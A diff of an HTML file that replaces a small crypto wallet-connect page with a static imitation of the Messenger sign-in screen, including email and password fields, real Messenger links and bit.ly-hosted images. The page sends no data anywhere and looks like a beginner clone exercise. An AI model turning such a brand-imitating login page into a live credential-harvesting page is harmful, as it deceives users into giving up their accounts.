@@ -1,59 +1,73 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
   <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>TON Payment Wallet Connect</title>
+	<title>Messenger</title>
+	<link rel=stylesheet href=style.css >
   </head>
   <body>
-    <h2>Connect EVM Wallet</h2>
-    <button id="connectWallet">Connect Wallet</button>
-    <p id="walletAddress"></p>
+	<div class="mother">
+	<div class="menu">
+	  <a href="https://play.google.com/store/apps/details?id=com.facebook.orca">
+	  <img src="https://bit.ly/47ndnlq" class="logo"/>
+	  </a>
+	  <a href="https://www.messenger.com/privacy" class="menuItem">Privacy & Safety</a>
+	  <a href="https://www.messenger.com/features#social" class="menuItem">Features</a>
+	 <a href="https://developers.facebook.com/products/messenger/" class="menuItem">For Developers</a>
+	  <a href="https://www.messenger.com/help" class="menuItem">Helps</a>
+	 
+	 </div>
+	 
+	 
+	
+	<div class="container">
+	 
+	 
+	<div class="left">
+	  <h1 class="header">
+		Be together, whenever.
+	  </h1>
+	  
 
-    <!-- ✅ Load Reown SDK FIRST -->
-    <script src="https://reown.com/sdk/reown.js"></script>
-
-    <script>
-      const PROJECT_ID = "7be08574a6238618945452abdd8b896a";
-
-      async function initWallet() {
-        console.log("Initializing Reown…");
-
-        if (typeof window.Reown === "undefined") {
-          alert("❌ Reown SDK failed to load. Check script URL.");
-          return;
-        }
-
-        // ✅ Proper initialization
-        const reown = new window.Reown({
-          projectId: PROJECT_ID,
-          chains: [1, 137, 56], // Ethereum, Polygon, BSC
-        });
-
-        window.reown = reown;
-        console.log("✅ Reown initialized", reown);
-      }
-
-      async function connectWallet() {
-        try {
-          if (!window.reown) {
-            await initWallet();
-          }
-
-          console.log("🚀 Connecting wallet...");
-          const provider = await window.reown.connect();
-
-          if (!provider) throw new Error("No provider returned");
-
-          const accounts = await provider.request({ method: "eth_requestAccounts" });
-          document.getElementById("walletAddress").innerText = `Connected: ${accounts[0]}`;
-        } catch (err) {
-          console.error("Wallet connection failed:", err);
-          alert("Wallet connection failed — check console logs for detailed errors.");
-        }
-      }
-
-      document.getElementById("connectWallet").addEventListener("click", connectWallet);
-    </script>
+		<div class="descraption">A simplebway to text,video chat abd plan things all in one place
+	  </div>
+	  <input type="text" class="blockElement" placeholder="Email address or Phone">
+	  <input type="password"class="blockElement" placeholder="Password">
+	  <button class="blockElement myanmar">Sign in </button> 
+	 <div class="input">
+	  <input type="checkbox" >
+	  <span>Keep me signed in</span>
+	 </div>
+	  <div class="forgot">Forgotten your password</div>
+	  <a href="https://play.google.com/store/apps/details?id=com.facebook.orca">
+	  <img src="http://bit.ly/47kpSzK" class="appstore">
+	  </a>
+	 
+	</div>
+		
+	  <div class="right">
+		<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQIuZIjBJ_AG5Bzb9TDIGJlqd9RU5JHlmLn-59D3-jqNw&s=10" class="rightimg">
+		
+		
+		
+		
+		
+		</div>
+	
+	  
+	</div>
+	</div>
+  
+	
+	<div class="footer">So many ways to connect with all friends</div>
+	
+	
+	
+	
+	
+	
+	
+	
+	
   </body>
 </html>
+  
